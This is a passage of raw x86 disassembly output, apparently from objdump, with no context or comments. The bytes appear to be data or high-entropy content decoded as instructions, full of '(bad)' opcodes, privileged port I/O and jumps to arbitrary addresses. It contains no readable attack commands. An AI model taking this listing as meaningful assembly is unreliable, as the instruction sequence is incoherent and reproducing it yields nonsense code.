  42a7ae:	mov    ah,0xc9
  42a7b0:	jmp    0x42a7ab
  42a7b2:	lock hlt 
  42a7b4:	enter  0xf4da,0xd7
  42a7b8:	ret    0xdc00
  42a7bb:	clc    
  42a7bc:	or     ch,al
  42a7be:	enter  0xddca,0x5
  42a7c2:	sti    
  42a7c3:	cld    
  42a7c4:	fnstcw WORD PTR [ebp-0x334d481c]
  42a7ca:	in     eax,dx
  42a7cb:	into   
  42a7cc:	(bad)  
  42a7cd:	iret   
  42a7ce:	out    dx,al
  42a7cf:	in     al,dx
  42a7d0:	bnd jmp 0x42a790
  42a7d3:	add    esp,edx
  42a7d5:	mov    dh,0xc7
  42a7d7:	shl    edi,cl
  42a7d9:	ret    0xf1c1
  42a7dc:	mov    al,0xc9
  42a7df:	out    dx,eax
  42a7e0:	in     eax,0xf
  42a7e2:	jmp    0xf3277aef
  42a7e7:	test   ecx,0xb0cfc0c0
  42a7ed:	iret   
  42a7ee:	in     eax,0xf7
  42a7f0:	in     eax,dx
  42a7f1:	aam    0xb5
  42a7f3:	jecxz  0x42a7d4
  42a7f5:	mov    eax,0xfde1f0ff
  42a7fa:	(bad)  
  42a7fb:	ffree  st(3)
  42a7fd:	pandn  mm0,QWORD PTR [edi]
  42a800:	(bad)  
  42a802:	in     eax,dx
  42a803:	add    dl,al
  42a805:	fsubrp st(6),st
  42a807:	retf   
  42a808:	mov    al,0xcd
  42a80a:	(bad)  
  42a80b:	hlt    
  42a80c:	mov    al,0xf6
  42a80e:	retf   
  42a80f:	sar    al,1
  42a811:	rcl    ah,cl
  42a813:	div    DWORD PTR [edi-0x42e1f12]
  42a819:	loop   0x42a810
  42a81b:	or     bh,cl
  42a81d:	fucom  st(7)
  42a81f:	call   0xe42bac13
  42a824:	iret   
  42a825:	in     al,0xae
  42a827:	int    0xc7
  42a829:	ret    0xe7d2
  42a82c:	call   0xb4f39121
  42a831:	clc    
  42a832:	fsubr  st(1),st
  42a834:	mov    esp,0xc5ede0da
  42a839:	icebp  
  42a83a:	add    eax,0xd7f904fe
  42a83f:	add    esp,ebx
  42a841:	retf   
  42a842:	psllw  mm3,mm1
  42a845:	in     eax,0xf1
  42a847:	loopne 0x42a7f8
  42a849:	shr    BYTE PTR [ebp-0xb053f54],cl
  42a84f:	(bad)  
  42a850:	mov    ecx,0xe0fad1be
  42a855:	int    0xc1
  42a857:	into   
  42a858:	icebp  
  42a859:	lock mov ebx,0xee2d808
  42a860:	out    0xfe,al
  42a862:	jecxz  0x42a82f
  42a864:	lods   al,BYTE PTR ds:[esi]
  42a865:	lds    esi,FWORD PTR [edi-0x303f1b35]
  42a86b:	repz mov ebx,0xf3f6cdf1
  42a871:	mov    esi,0x3d5eeff
  42a876:	fistp  QWORD PTR [esi+0x5d6fed9]
  42a87c:	leave  
  42a87d:	out    0xf8,al
  42a87f:	into   
  42a880:	push   es
  42a881:	out    0xf8,eax
  42a883:	pop    es
  42a884:	mov    dl,0xb0
  42a887:	shr    BYTE PTR [edi-0x3b1f2a56],cl
  42a88d:	mov    edx,0xcbc8feb5
  42a892:	add    ebx,ebx
  42a894:	(bad)  
  42a896:	(bad)  
  42a898:	out    0xe4,eax
  42a89a:	repz fcmovu st,st(4)
  42a89d:	lock loop 0x42a89a
  42a8a0:	add    al,BYTE PTR [edx]
  42a8a2:	clc    
  42a8a3:	cld    
  42a8a4:	int3   
  42a8a5:	rol    bh,0xad
  42a8a8:	out    0xbc,al
  42a8aa:	mov    ah,0xbb
  42a8ac:	retf   0xf8e8
  42a8af:	leave  
  42a8b0:	cld    
  42a8b1:	in     eax,dx
  42a8b2:	jmp    0x42a8ac
  42a8b4:	mov    esi,0xdbddc200
  42a8b9:	loopne 0x42a8ba
  42a8bb:	shl    esi,0xc6
  42a8be:	(bad)  
  42a8bf:	in     eax,dx
  42a8c0:	add    al,cl
  42a8c2:	loop   0x42a8b6
  42a8c4:	(bad)  
  42a8c5:	repz into 
  42a8c7:	scas   eax,DWORD PTR es:[edi]
  42a8c8:	mov    ebp,0xd6fbf1f6
  42a8cd:	fcmovbe st,st(6)
  42a8cf:	cmc    
  42a8d0:	mov    ebp,0xd7e902f3
  42a8d5:	out    dx,al
  42a8d6:	cmc    
  42a8d7:	mov    edi,0xead3ebd7
  42a8dc:	(bad)  
  42a8de:	cld    
  42a8df:	loopne 0x42a8be
  42a8e1:	add    edx,edi
  42a8e3:	or     al,0xc5
  42a8e5:	jmp    0xd1fa789c
  42a8ea:	int3   
  42a8eb:	loopne 0x42a8a0
  42a8ed:	leave  
  42a8ee:	hlt    
  42a8ef:	shl    DWORD PTR [ebp-0x23110f0d],1
  42a8f5:	shl    eax,0xd0
  42a8f8:	(bad)  
  42a8fa:	add    BYTE PTR [esp+esi*8],al
  42a8fd:	mov    esi,0xf906caf5
  42a902:	add    eax,0xe5d0dce8
  42a907:	loopne 0x42a8ee
  42a909:	in     eax,dx
  42a90a:	(bad)
  42a90d:	(bad)
  42a910:	icebp  
  42a911:	mov    ah,0xb4
  42a913:	jmp    0xd3356b1a
  42a918:	push   es
  42a919:	add    eax,0xfadc0ae3
  42a91e:	(bad)  
  42a91f:	fsubrp st(4),st
  42a921:	(bad)  
  42a922:	into   
  42a923:	jmp    0xd62f8e0a
  42a928:	ret    
  42a929:	sti    
  42a92a:	enter  0xcdb3,0xb5
  42a92e:	mov    edi,0xd1f0d9f0
  42a933:	(bad)  
  42a935:	loope  0x42a932
  42a937:	lock fsubrp st(5),st
  42a93a:	or     al,BYTE PTR [eax+esi*8]
  42a93d:	retf   
  42a93e:	pmullw mm4,mm7
  42a941:	add    cl,bh
  42a943:	jmp    0x42a901
  42a945:	mov    esp,0xb4c5c8e3
  42a94a:	(bad)  
  42a94b:	in     eax,dx
  42a94c:	in     eax,0xe7
  42a94e:	in     al,dx
  42a94f:	mov    esi,0xcf02b2d3
  42a954:	ret    
  42a955:	stc    
  42a956:	int    0xf1
  42a958:	in     al,0xc1
  42a95a:	mul    cl
  42a95c:	or     ah,dl
  42a95e:	(bad)
  42a961:	add    ecx,edi
  42a963:	adc    DWORD PTR [edi-0x1a354d34],ebp
  42a969:	sti    
  42a96a:	jmp    0x42a967
  42a96c:	fptan  
  42a96e:	(bad)  
  42a96f:	mov    esi,0xbbeddfeb
  42a974:	out    dx,al
  42a975:	mov    esp,0xf0f6f501
  42a97a:	rol    ecx,1
  42a97c:	mov    edi,0xfcc5fa0b
  42a981:	add    bl,cl
  42a983:	loopne 0x42a931
  42a985:	div    DWORD PTR [eax-0x1630100f]
  42a98b:	mov    edx,0xd1b9f5c0
  42a990:	repz shr al,1
  42a993:	add    ch,bh
  42a995:	sar    DWORD PTR [esi-0x212b4224],cl
  42a99b:	fxch   st(1)
  42a99d:	out    0x7,eax
  42a99f:	fcmove st,st(6)
  42a9a1:	in     al,dx
  42a9a2:	stc    
  42a9a3:	jmp    0xee118864
  42a9a8:	out    0xc1,al
  42a9aa:	(bad)  
  42a9ab:	mov    ebx,0xdfe7d4d6
  42a9b0:	repnz (bad) 
  42a9b2:	in     eax,dx
  42a9b3:	loope  0x42a992
  42a9b5:	int    0xb9
  42a9b7:	fcmovnbe st,st(0)
  42a9b9:	mov    BYTE PTR [esi],0xe2
  42a9bc:	(bad)  
  42a9be:	add    ecx,DWORD PTR ds:0xff12e5fd
  42a9c4:	mov    esp,0xadb6edad
  42a9c9:	stos   BYTE PTR es:[edi],al
  42a9ca:	shl    BYTE PTR [eax-0x2407150b],1
  42a9d0:	shl    BYTE PTR [eax+edi*8-0x4170111],cl
  42a9d7:	inc    DWORD PTR [ebx]
  42a9d9:	fcomp  st(1)
  42a9db:	rol    cl,1
  42a9dd:	clc    
  42a9de:	or     dh,dl
  42a9e0:	or     eax,0xbe05e3ce
  42a9e5:	ret    0xc8ed
  42a9e8:	out    dx,eax
  42a9e9:	enter  0xe4db,0xfa
  42a9ed:	int3   
  42a9ee:	cli    
  42a9ef:	cli    
  42a9f0:	(bad)  
  42a9f2:	(bad)  
  42a9f4:	mov    ebp,0xd3e0d9c8
  42a9f9:	fadd   DWORD PTR [ecx]
  42a9fb:	stc    
  42a9fc:	out    0xdf,eax
  42a9fe:	loopne 0x42aa07
  42aa00:	(bad)  
  42aa02:	dec    esi
  42aa04:	jmp    0xe6eb99d8
  42aa09:	in     eax,0xee
  42aa0b:	icebp  
  42aa0c:	xlat   BYTE PTR ds:[ebx]
  42aa0d:	rol    ebp,1
  42aa0f:	in     al,0xb7
  42aa11:	iret   
  42aa12:	mov    ebp,0xc0c0d4f2
  42aa17:	icebp  
  42aa18:	aad    0xff
  42aa1a:	pop    es
  42aa1b:	retf   0xfe0b
  42aa1e:	fcmove st,st(3)
  42aa20:	into   
  42aa21:	in     eax,0x9
  42aa23:	call   0xad2b5dd2
  42aa28:	rol    edx,0xfb
  42aa2b:	mov    bl,0xf7
  42aa2d:	out    dx,eax
  42aa2e:	(bad)
  42aa31:	clc    
  42aa32:	fcomp  st(3)
  42aa34:	ret    0xe6bf
  42aa37:	(bad)  
  42aa39:	mov    edx,0xfdcdfc7
  42aa3e:	mov    ebp,0x4e2dc06
  42aa43:	ffree  st(6)
  42aa45:	int    0xdd
  42aa47:	mov    esi,0xc6c3c0eb
  42aa4c:	jmp    0xdd2f9321
  42aa51:	mov    ebp,0xe2c3d8dc
  42aa56:	aam    0xfc
  42aa58:	xlat   BYTE PTR ds:[ebx]
  42aa59:	in     al,dx
  42aa5a:	add    al,dl
  42aa5c:	jmp    ebx
  42aa5e:	out    dx,al
  42aa5f:	retf   
  42aa60:	or     eax,0xc412ed05
  42aa65:	bnd ret 
  42aa67:	shl    DWORD PTR [edx-0x1e3a1737],cl
  42aa6d:	in     eax,dx
  42aa6e:	clc    
  42aa6f:	repz in eax,dx
  42aa71:	in     eax,dx
  42aa72:	into   
  42aa73:	(bad)  
  42aa75:	enter  0xf0e0,0xd6
  42aa79:	ffree  st(3)
  42aa7b:	aam    0xc6
  42aa7d:	fucomp st(6)
  42aa7f:	or     ch,dl
  42aa81:	ret    0x3dc
  42aa84:	mov    bl,0xe1
  42aa86:	in     eax,0xa4
  42aa88:	jmp    0xf5f35e71
  42aa8d:	idiv   dl
  42aa8f:	leave  
  42aa90:	(bad)  
  42aa92:	repz mov edi,0xf9b9fccd
  42aa98:	sar    bh,cl
  42aa9a:	push   es
  42aa9b:	out    0xc2,al
  42aa9d:	sar    ebp,0xe
  42aaa0:	les    eax,FWORD PTR [edi]
  42aaa2:	jecxz  0x42aaaa
  42aaa4:	in     eax,0xc1
  42aaa6:	rcl    edx,0xb7
  42aaa9:	scas   al,BYTE PTR es:[edi]
  42aaaa:	enter  0xe0ed,0xce
  42aaae:	faddp  st(4),st
  42aab0:	(bad)  
  42aab1:	jmp    edx
  42aab3:	clc    
  42aab4:	call   0xf3167fa5
  42aab9:	jecxz  0x42aa74
  42aabb:	hlt    
  42aabc:	call   0xce41b5b6
  42aac1:	loopne 0x42aaa3
  42aac3:	out    0xbd,eax
  42aac5:	jecxz  0x42aa8b
  42aac7:	mov    bl,0xb7
  42aac9:	mov    bl,0xf0
  42aacb:	rol    esi,cl
  42aacd:	int3   
  42aace:	jmp    0xfab4:0xcceec9ba
  42aad5:	cli    
  42aad6:	stc    
  42aad7:	mov    esp,0x5d1fdf9
  42aadc:	jmp    esp
  42aade:	rol    BYTE PTR [edx],0xc8
  42aae1:	(bad)  
  42aae2:	fcmove st,st(4)
  42aae4:	mov    cl,0xcc
  42aae6:	fst    st(2)
  42aae8:	aad    0xe3
  42aaea:	(bad)  
  42aaeb:	sti    
  42aaec:	loope  0x42aae6
  42aaee:	mov    eax,0xebdbddcb
  42aaf3:	(bad)  
  42aaf4:	mov    edi,0xedbfcee0
  42aaf9:	sti    
  42aafa:	add    al,0xdd
  42aafc:	stc    
  42aafd:	pop    es
  42aafe:	(bad)  
  42ab00:	(bad)  
  42ab02:	(bad)  
  42ab03:	fucompp 
  42ab05:	repnz test eax,0xe7d2e1b6
  42ab0b:	hlt    
  42ab0c:	repnz mov cl,0xca
  42ab0f:	jmp    ebp
  42ab11:	mov    esi,0xdcbbddd8
  42ab16:	int3   
  42ab17:	clc    
  42ab18:	push   es
  42ab19:	loop   0x42ab1c
  42ab1b:	loopne 0x42ab08
  42ab1d:	cli    
  42ab1e:	sti    
  42ab1f:	jecxz  0x42ab07
  42ab21:	push   cs
  42ab22:	(bad)  
  42ab23:	rol    dh,cl
  42ab25:	(bad)  
  42ab26:	int    0xaf
  42ab28:	loopne 0x42aaf1
  42ab2a:	mov    ebx,0xd7ebe5eb
  42ab2f:	(bad)  
  42ab30:	cli    
  42ab31:	shl    ah,1
  42ab33:	fptan  
  42ab35:	fnstsw ax
  42ab37:	add    eax,0xf5d8e103
  42ab3c:	hlt    
  42ab3d:	fadd   QWORD PTR [ecx+eax*1]
  42ab40:	cmc    
  42ab41:	leave  
  42ab42:	jmp    0xefd6:0xe7cecbe6
  42ab49:	scas   al,BYTE PTR es:[edi]
  42ab4a:	retf   0xaff4
  42ab4d:	out    dx,al
  42ab4e:	sar    ebx,1
  42ab50:	leave  
  42ab51:	imul   esi
  42ab53:	rcr    ebx,1
  42ab55:	repnz std 
  42ab57:	mov    edi,0xc3c4dae0
  42ab5c:	call   0x619a760
  42ab61:	int    0x0
  42ab63:	cli    
  42ab64:	ror    esp,cl
  42ab66:	leave  
  42ab67:	rcr    ebp,0xe8
  42ab6a:	shl    BYTE PTR [eax+esi*4-0xa351b40],cl
  42ab71:	(bad)  
  42ab73:	(bad)  
  42ab74:	rcr    al,cl
  42ab76:	shl    ecx,1
  42ab78:	shl    dl,0xc7
  42ab7b:	stc    
  42ab7c:	stc    
  42ab7d:	sar    edx,0xfc
  42ab80:	in     eax,dx
  42ab81:	add    eax,0xc2dcda0d
  42ab86:	test   eax,0xb0edf1b7
  42ab8b:	repnz rol esp,0xfa
  42ab8f:	leave  
  42ab90:	mov    eax,0xd6f6f2bc
  42ab95:	icebp  
  42ab96:	mov    ch,0xc3
  42ab98:	pop    es
  42ab99:	neg    ebx
  42ab9b:	aad    0x7
  42ab9d:	add    ebx,esi
  42ab9f:	fsubp  st(3),st
  42aba1:	cli    
  42aba2:	or     dl,BYTE PTR [edx]
  42aba4:	(bad)  
  42aba5:	int    0xbf
  42aba7:	mov    esi,0xc1adc4d5
  42abac:	repnz mov al,0xd4
  42abaf:	fcmovb st,st(5)
  42abb1:	dec    cl
  42abb3:	sti    
  42abb4:	ror    ch,1
  42abb6:	(bad)  
  42abb8:	loope  0x42abac
  42abba:	add    eax,0xd6e405d2
  42abbf:	imul   bl
  42abc1:	or     bl,dl
  42abc3:	repz mov cl,0xd1
  42abc6:	(bad)  
  42abc7:	mov    al,0xf1
  42abc9:	mov    esp,0xd6d4d1f0
  42abce:	enter  0xb4ac,0xb5
  42abd2:	iret   
  42abd3:	mov    eax,0xe3bdbff4
  42abd8:	rol    ch,0xf6
  42abdb:	push   es
  42abdc:	fcmovu st,st(3)
  42abde:	fcmovnu st,st(6)
  42abe0:	pminub mm7,mm0
  42abe3:	(bad)  
  42abe4:	mov    eax,0xc4c1c6c2
  42abe9:	mov    esp,0xd9e8e7e2
  42abee:	int    0xe4
  42abf0:	mov    esi,0xc9f003be
  42abf5:	loopne 0x42abd7
  42abf7:	cli    
  42abf8:	icebp  
  42abf9:	add    eax,edx
  42abfb:	loopne 0x42abda
  42abfd:	jecxz  0x42abfb
  42abff:	(bad)  
  42ac00:	loop   0x42abc4
  42ac02:	in     eax,0xcc
  42ac04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ac05:	out    0xcb,eax
  42ac07:	icebp  
  42ac08:	mov    al,0xc9
  42ac0a:	not    dh
  42ac0c:	out    0xec,eax
  42ac0e:	fcmovnu st,st(3)
  42ac10:	imul   dl
  42ac12:	repz loope 0x42ac13
  42ac15:	sar    al,cl
  42ac17:	fst    st(0)
  42ac19:	add    ebx,ebp
  42ac1b:	add    eax,0xdc4cbe9
  42ac20:	jmp    0xf2e1:0xc912dfcb
  42ac27:	scas   al,BYTE PTR es:[edi]
  42ac28:	jmp    0xbfc4:0xb2b1cfce
  42ac2f:	in     al,0xcc
  42ac31:	div    al
  42ac33:	cmc    
  42ac34:	fistp  QWORD PTR [eax-0x1f083248]
  42ac3a:	jecxz  0x42ac1c
  42ac3c:	fcmovb st,st(4)
  42ac3e:	(bad)  
  42ac42:	retf   
  42ac43:	or     esi,DWORD PTR [ebx-0x36410832]
  42ac49:	mov    dh,0xc0
  42ac4b:	out    dx,al
  42ac4c:	(bad)  
  42ac4d:	(bad)  
  42ac4f:	(bad)  
  42ac50:	repz (bad) 
  42ac52:	leave  
  42ac53:	ror    bh,1
  42ac55:	cld    
  42ac56:	add    dl,al
  42ac58:	cli    
  42ac59:	shl    edx,0xf8
  42ac5c:	add    dh,bh
  42ac5e:	cmc    
  42ac5f:	loope  0x42ac4a
  42ac61:	jmp    0x42ac67
  42ac63:	les    edi,FWORD PTR [ebp-0x54192f36]
  42ac69:	fsubr  st(7),st
  42ac6b:	(bad)
  42ac6e:	mov    bh,0xba
  42ac70:	(bad)  
  42ac71:	xlat   BYTE PTR ds:[ebx]
  42ac72:	mov    eax,0x202f8f4
  42ac77:	not    ebp
  42ac79:	push   es
  42ac7a:	clc    
  42ac7b:	ffree  st(5)
  42ac7d:	cli    
  42ac7e:	fdivr  st(5),st
  42ac80:	int    0xea
  42ac82:	add    ebp,esp
  42ac84:	loope  0x42ac39
  42ac86:	mov    edi,0xefc2c5be
  42ac8b:	out    dx,al
  42ac8c:	int3   
  42ac8d:	mov    ebx,0xdef3d1b5
  42ac92:	(bad)  
  42ac93:	(bad)  
  42ac94:	sti    
  42ac95:	ret    
  42ac96:	shl    cl,0xd2
  42ac99:	repz cli 
  42ac9b:	test   DWORD PTR [edx],0xdde3e001
  42aca1:	ret    0x3e4
  42aca4:	int3   
  42aca5:	(bad)  
  42aca6:	enter  0xe1e2,0xae
  42acaa:	jmp    0x42aca0
  42acac:	retf   0xd4e9
  42acaf:	mov    esi,0xccfab9dc
  42acb4:	clc    
  42acb5:	rol    DWORD PTR [edx],cl
  42acb7:	pop    es
  42acb8:	loopne 0x42ac8a
  42acba:	(bad)  
  42acbb:	hlt    
  42acbc:	stc    
  42acbd:	mov    BYTE PTR ds:0xd9f4c8f4,0xc8
  42acc4:	rol    ebx,1
  42acc6:	lods   eax,DWORD PTR ds:[esi]
  42acc7:	mov    dl,0xb5
  42acc9:	in     eax,dx
  42acca:	int3   
  42accb:	(bad)  
  42accd:	(bad)  
  42acce:	(bad)  
  42acd0:	jmp    0x42aca7
  42acd2:	(bad)  
  42acd4:	sti    
  42acd5:	mov    esi,0xd2bef7bc
  42acda:	aam    0x2
  42acdc:	in     al,0xd8
  42acde:	sti    
  42acdf:	push   es
  42ace0:	fcmove st,st(5)
  42ace2:	bswap  ebp
  42ace4:	jmp    0x42acb6
  42ace6:	in     al,dx
  42ace7:	loope  0x42ac9f
  42ace9:	int3   
  42acea:	aam    0xb1
  42acec:	cli    
  42aced:	out    0xbb,eax
  42acef:	int3   
  42acf0:	in     al,dx
  42acf1:	mov    ah,0xcb
  42acf3:	aad    0x1
  42acf5:	sar    BYTE PTR [ebp-0x23010902],0xe3
  42acfc:	sti    
  42acfd:	jmp    0x42acc3
  42acff:	loop   0x42ace0
  42ad01:	in     al,0x13
  42ad03:	leave  
  42ad04:	fsubr  st(0),st
  42ad06:	in     eax,dx
  42ad07:	test   al,0xce
  42ad09:	mov    bh,0xcb
  42ad0b:	ret    0xd7ef
  42ad0e:	clc    
  42ad0f:	aad    0xc4
  42ad11:	rcr    bh,cl
  42ad13:	xlat   BYTE PTR ds:[ebx]
  42ad14:	add    bh,BYTE PTR [ecx-0x22130606]
  42ad1a:	jmp    0xc3c8:0xfc0bebc7
  42ad21:	in     eax,dx
  42ad22:	loop   0x42ad05
  42ad24:	leave  
  42ad25:	ret    0xbcdd
  42ad28:	jecxz  0x42acf6
  42ad2a:	in     al,dx
  42ad2b:	mov    bh,0xf8
  42ad2d:	in     al,dx
  42ad2e:	in     al,0xfe
  42ad30:	test   BYTE PTR [ebx],0xd5
  42ad33:	add    eax,edx
  42ad35:	cld    
  42ad36:	sti    
  42ad37:	rcl    ebx,cl
  42ad39:	repnz add al,bl
  42ad3c:	ret    
  42ad3d:	cli    
  42ad3e:	fstp   st(0)
  42ad40:	std    
  42ad41:	paddusw mm2,QWORD PTR [ebx]
  42ad44:	fmul   st(6),st
  42ad46:	test   eax,0xdbf3b7e9
  42ad4b:	hlt    
  42ad4c:	(bad)  
  42ad4d:	xlat   BYTE PTR ds:[ebx]
  42ad4e:	(bad)
  42ad51:	in     al,dx
  42ad52:	mov    esp,0x3c1f8d2
  42ad57:	out    0xbf,al
  42ad59:	add    dl,dl
  42ad5b:	(bad)  
  42ad5c:	mov    edi,0xd8fde8e7
  42ad61:	loop   0x42ad28
  42ad63:	repz in eax,0xd3
  42ad66:	mov    esp,0xf3eaeeeb
  42ad6b:	shl    ebp,1
  42ad6d:	repz fpatan 
  42ad70:	enter  0xd9f3,0xfb
  42ad74:	iret   
  42ad75:	out    0xdd,eax
  42ad77:	ret    0xe7ff
  42ad7a:	(bad)  
  42ad7c:	stc    
  42ad7d:	loopne 0x42ad7e
  42ad7f:	cli    
  42ad80:	fsub   st,st(2)
  42ad82:	fimul  WORD PTR [esi+eiz*8]
  42ad85:	mov    al,0xaf
  42ad87:	out    dx,eax
  42ad88:	iret   
  42ad89:	enter  0xd2c1,0xf7
  42ad8d:	(bad)  
  42ad8e:	hlt    
  42ad8f:	mov    bh,0xe8
  42ad91:	aad    0xf2
  42ad93:	out    dx,al
  42ad94:	fdivrp st(6),st
  42ad96:	cld    
  42ad97:	call   ebx
  42ad99:	loope  0x42ad9f
  42ad9b:	(bad)  
  42ad9d:	out    0xa,eax
  42ad9f:	(bad)
  42ada2:	fsubp  st(7),st
  42ada4:	mov    esp,0xc3f6b1ea
  42ada9:	cmc    
  42adaa:	(bad)  
  42adab:	rcl    ebp,cl
  42adad:	(bad)  
  42adae:	mov    ah,0xdf
  42adb0:	stc    
  42adb1:	aam    0xe8
  42adb3:	call   ebp
  42adb5:	fsubp  st(7),st
  42adb7:	mov    esp,0xcb07e1bc
  42adbc:	fcomip st,st(7)
  42adbe:	psubd  mm4,mm6
  42adc1:	add    eax,0xa8cac0ff
  42adc6:	shl    cl,cl
  42adc8:	aam    0xaa
  42adca:	mov    bl,0xe9
  42adcc:	div    bh
  42adce:	into   
  42adcf:	(bad)  
  42add0:	mov    dh,0xd9
  42add2:	int    0xd0
  42add4:	mov    esp,0x7c3f5e1
  42add9:	std    
  42adda:	rol    BYTE PTR [eax],0xa
  42addd:	lock fmul QWORD PTR [eax]
  42ade0:	call   0xbe25acbe
  42ade5:	enter  0xd7bd,0xcb
  42ade9:	jecxz  0x42ad98
  42adeb:	les    esi,FWORD PTR [ebp-0xb082d10]
  42adf1:	repz in eax,dx
  42adf3:	fcmovnu st,st(1)
  42adf5:	pop    es
  42adf6:	add    ah,al
  42adf8:	loop   0x42adfc
  42adfa:	(bad)
  42adfd:	add    bh,ah
  42adff:	cli    
  42ae00:	or     dh,bl
  42ae02:	sti    
  42ae03:	(bad)  
  42ae04:	stos   DWORD PTR es:[edi],eax
  42ae05:	sar    DWORD PTR [edi-0x15350f53],cl
  42ae0b:	div    BYTE PTR [eax-0x354a4f13]
  42ae11:	shl    edx,cl
  42ae13:	repz repz cli 
  42ae16:	aam    0x1
  42ae18:	fstp   TBYTE PTR [esi+0xfd8c7f5]
  42ae1e:	leave  
  42ae1f:	ftst   
  42ae21:	loop   0x42ae11
  42ae23:	out    0xc0,al
  42ae25:	iret   
  42ae26:	shr    ah,1
  42ae28:	(bad)  
  42ae29:	loop   0x42ae05
  42ae2b:	mov    al,0xcf
  42ae2d:	xlat   BYTE PTR ds:[ebx]
  42ae2e:	(bad)  
  42ae2f:	fcomip st,st(0)
  42ae31:	shl    ebp,1
  42ae33:	std    
  42ae34:	out    dx,al
  42ae35:	out    dx,eax
  42ae36:	mov    ch,0xd7
  42ae38:	sar    DWORD PTR [esi+eax*1-0x372f2409],0xe8
  42ae40:	(bad)  
  42ae41:	in     al,dx
  42ae42:	jmp    0xcfd3:0xefd2e5df
  42ae49:	jmp    0xcdc7:0xb6b4eaea
  42ae50:	in     al,dx
  42ae51:	fdivr  QWORD PTR [edi-0x3e11300a]
  42ae57:	fld    DWORD PTR [ecx]
  42ae59:	add    bl,ch
  42ae5b:	loope  0x42ae1d
  42ae5d:	enter  0xeddd,0x7
  42ae61:	loop   0x42ae65
  42ae63:	iret   
  42ae64:	lock out 0xc2,eax
  42ae67:	out    0xac,eax
  42ae69:	out    0xc1,eax
  42ae6b:	call   0xc5fc884b
  42ae70:	(bad)
  42ae73:	(bad)  
  42ae74:	jmp    0xe722886c
  42ae79:	in     al,dx
  42ae7a:	loop   0x42ae7d
  42ae7c:	jmp    0xcbe9:0xee0f0ec7
  42ae83:	retf   
  42ae84:	loope  0x42ae6e
  42ae86:	loop   0x42ae35
  42ae88:	mov    ch,0xc3
  42ae8a:	in     eax,dx
  42ae8b:	in     eax,0xcf
  42ae8d:	sar    bl,1
  42ae8f:	in     al,dx
  42ae90:	in     eax,dx
  42ae91:	jmp    0x42ae44
  42ae93:	in     al,dx
  42ae94:	jecxz  0x42ae86
  42ae96:	(bad)  
  42ae97:	std    
  42ae98:	in     al,dx
  42ae99:	pop    es
  42ae9a:	hlt    
  42ae9b:	aad    0x7
  42ae9d:	mov    DWORD PTR [ebx],0xdbf4fae7
  42aea3:	std    
  42aea4:	lock retf 0xdce8
  42aea8:	iret   
  42aea9:	aam    0xee
  42aeab:	mov    bh,0xb9
  42aead:	xlat   BYTE PTR ds:[ebx]
  42aeae:	lock sar BYTE PTR [edx-0xc043c30],1
  42aeb5:	stc    
  42aeb6:	fcmovu st,st(5)
  42aeb8:	(bad)  
  42aeba:	rol    BYTE PTR [eax],cl
  42aebc:	fucom  st(2)
  42aebe:	in     eax,0xc9
  42aec0:	fld    QWORD PTR [ebx]
  42aec2:	in     eax,dx
  42aec3:	int3   
  42aec4:	mov    eax,0xebb1d1ca
  42aec9:	icebp  
  42aeca:	cmc    
  42aecb:	mov    ch,0xc5
  42aecd:	mov    ecx,0xf2b7fbce
  42aed2:	sti    
  42aed3:	loop   0x42aeae
  42aed5:	rcl    edi,0xcc
  42aed8:	jecxz  0x42aec1
  42aeda:	loope  0x42aede
  42aedc:	neg    dh
  42aede:	loope  0x42aeaf
  42aee0:	call   0xe20db8bf
  42aee5:	ror    esi,0xce
  42aee8:	lock aam 0xf7
  42aeeb:	cmc    
  42aeec:	cli    
  42aeed:	sar    edx,1
  42aeef:	(bad)  
  42aef0:	aad    0xf4
  42aef2:	fsubrp st(3),st
  42aef4:	rcl    eax,0xd3
  42aef7:	out    0xe1,eax
  42aef9:	mov    esi,0xe4f6d4d0
  42aefe:	std    
  42aeff:	or     ah,bh
  42af01:	add    cl,ah
  42af03:	push   cs
  42af04:	jmp    0xace1:0xdcc9bdb3
  42af0b:	mov    bl,0xbb
  42af0d:	enter  0xb9e6,0xcf
  42af11:	(bad)  
  42af13:	cld    
  42af14:	std    
  42af15:	stc    
  42af16:	out    0xd5,eax
  42af18:	idiv   DWORD PTR [edx-0x370f383a]
  42af1e:	fisttp QWORD PTR [ecx]
  42af20:	ret    
  42af21:	add    dh,bl
  42af23:	or     al,0xbc
  42af25:	mov    edi,0xe0e2aeb3
  42af2a:	cli    
  42af2b:	into   
  42af2c:	jmp    0xb9be:0xc5b4eaca
  42af33:	mov    ecx,0xdff5dbf0
  42af38:	sar    edx,cl
  42af3a:	loop   0x42af1f
  42af3c:	std    
  42af3d:	(bad)
  42af40:	jmp    0xde11b11f
  42af45:	ret    0xe1ee
  42af48:	enter  0xf1c0,0xee
  42af4c:	rol    dh,1
  42af4e:	int    0xf4
  42af50:	repz mov esp,0xfff5d8de
  42af56:	cli    
  42af57:	rcl    esp,0xe6
  42af5a:	mov    ebp,0xd4d4dcf5
  42af5f:	or     eax,0xece3c5df
  42af64:	out    dx,eax
  42af65:	test   al,0xc8
  42af67:	fidivr WORD PTR [ebp+eax*8-0x3a251138]
  42af6e:	int3   
  42af6f:	mul    ch
  42af71:	mov    esp,0xecf2b0ec
  42af76:	std    
  42af77:	(bad)  
  42af78:	in     al,dx
  42af79:	not    edi
  42af7b:	jmp    0xfac7:0xfc5d4c3
  42af82:	call   0xf7067067
  42af87:	(bad)  
  42af88:	int    0xe6
  42af8a:	(bad)  
  42af8b:	repz (bad) 
  42af8d:	jmp    ebp
  42af8f:	jmp    0x42af70
  42af91:	mov    edx,0xdedcfcbd
  42af96:	push   es
  42af97:	mov    dh,0xd0
  42af9a:	pop    es
  42af9b:	mov    esp,0xc0e0bedb
  42afa0:	paddsw mm0,QWORD PTR [edi]
  42afa3:	in     eax,dx
  42afa4:	(bad)  
  42afa6:	call   0xd0f8747e
  42afab:	repnz mov al,0xf6
  42afae:	lods   eax,DWORD PTR ds:[esi]
  42afaf:	mov    ch,0xf0
  42afb1:	add    ebp,esp
  42afb3:	fcomi  st,st(4)
  42afb5:	out    dx,al
  42afb6:	fstp   TBYTE PTR [eax-0x280b33ff]
  42afbc:	aad    0xeb
  42afbe:	aad    0xdf
  42afc0:	push   cs
  42afc1:	add    al,BYTE PTR [edi]
  42afc3:	or     al,0xbe
  42afc5:	mov    bl,0xef
  42afc7:	shr    DWORD PTR [ebp+edx*8-0x4171d4d],cl
  42afce:	iret   
  42afcf:	mov    ecx,0xcddabceb
  42afd4:	ret    
  42afd5:	std    
  42afd6:	ffree  st(6)
  42afd8:	in     al,dx
